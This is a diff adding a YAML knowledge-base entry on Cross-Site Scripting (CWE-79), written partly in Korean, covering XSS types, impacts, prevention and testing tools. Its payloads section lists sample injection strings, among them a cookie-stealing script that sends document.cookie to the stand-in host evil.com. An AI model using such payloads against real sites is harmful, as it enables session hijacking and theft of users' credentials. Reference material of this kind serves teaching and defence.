@@ -1,0 +1,107 @@
+# GR Atom: Cross-Site Scripting
+# Version: 1.0
+# Created: 2025-01-29
+
+identity:
+  id: "VUL-WEB-XSS-001"
+  name: "Cross-Site Scripting"
+  normalization:
+    normalized_name: "xss cross site scripting javascript injection"
+    normalization_version: "1.0"
+  aliases:
+    - "XSS"
+    - "Cross-Site Scripting"
+    - "크로스 사이트 스크립팅"
+
+classification:
+  domain: security
+  type: vulnerability
+  abstraction_level: 2
+  gr_coordinates:
+    layer: "L7"
+    zone: "Zone2"
+    tags: ["VUL", "WEB", "OWASP"]
+
+definition:
+  what: |
+    악성 스크립트가 웹 페이지에 삽입되어 다른 사용자의
+    브라우저에서 실행되는 코드 인젝션 취약점이다.
+  why: |
+    세션 쿠키를 탈취한다.
+    사용자 행동을 조작한다.
+  how: |
+    1. 입력 필드 식별
+    2. 스크립트 삽입
+    3. 피해자 유인
+    4. 스크립트 실행
+
+relations:
+  structural:
+    is_a:
+      - "VUL-INJECTION-001"
+    related_to:
+      - "VUL-WEB-CSRF-001"
+      - "ATK-WEB-CLIENT-001"
+
+properties:
+  technical:
+    cwe_id: "CWE-79"
+    owasp_rank: "OWASP Top 10 2021 - A03 Injection"
+    types:
+      - name: "Reflected XSS"
+        persistence: "비저장"
+        vector: "URL 파라미터"
+      - name: "Stored XSS"
+        persistence: "저장됨"
+        vector: "댓글, 게시글"
+      - name: "DOM-based XSS"
+        persistence: "클라이언트"
+        vector: "JavaScript DOM"
+    payloads:
+      basic: "<script>alert(1)</script>"
+      cookie: "<script>document.location='http://evil.com/?c='+document.cookie</script>"
+      event: "<img src=x onerror=alert(1)>"
+      svg: "<svg onload=alert(1)>"
+    impact:
+      - "세션 하이재킹"
+      - "피싱"
+      - "키로깅"
+      - "악성코드 배포"
+      - "웹사이트 변조"
+    prevention:
+      - "출력 인코딩 (HTML, JS, URL)"
+      - "입력 검증"
+      - "Content Security Policy (CSP)"
+      - "HttpOnly 쿠키"
+      - "X-XSS-Protection 헤더"
+    testing_tools:
+      - "Burp Suite"
+      - "OWASP ZAP"
+      - "XSStrike"
+
+metadata:
+  trust:
+    source: official
+    references:
+      - "OWASP XSS"
+      - "CWE-79"
+    confidence: 1.0
+    verified:
+      status: verified
+      date: 2025-01-29
+      by: "GR System"
+  temporal:
+    created: 2025-01-29
+    modified: 2025-01-29
+    revision: 1
+  security:
+    sensitivity: public
+  ai:
+    embedding_text: |
+      XSS는 악성 스크립트가 웹 페이지에 삽입되어
+      사용자 브라우저에서 실행되는 클라이언트 측 취약점이다.
+    search_keywords:
+      - "XSS"
+      - "Cross-Site Scripting"
+      - "JavaScript Injection"
+      - "쿠키 탈취"
